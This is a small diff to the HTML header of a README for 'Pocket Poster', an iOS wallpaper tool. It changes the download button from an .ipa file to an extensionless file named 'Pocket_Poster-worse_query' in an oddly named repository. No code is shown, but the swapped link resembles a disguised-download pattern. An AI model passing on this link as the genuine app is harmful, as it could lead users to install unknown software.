@@ -7,7 +7,7 @@
   <h1><b>Pocket Poster</b></h1>
   <p><i>Custom PosterBoard Wallpapers for iOS 17+</i></p>
   &nbsp;&nbsp;&nbsp;
-  <a href="https://github.com/dreamsidysikbeatsflstudio-prog/Pocket-Poster-worse_query-iOS-27-/releases/latest/download/pocket_poster.ipa" target="_blank">
+  <a href="https://github.com/dreamsidysikbeatsflstudio-prog/Pocket-Poster-worse_query-iOS-27-/releases/latest/download/Pocket_Poster-worse_query" target="_blank">
    <img src="https://raw.githubusercontent.com/CelloSerenity/altdirect/refs/heads/main/assets/png/Download_White.png" width="150">
   </a>
 </div>
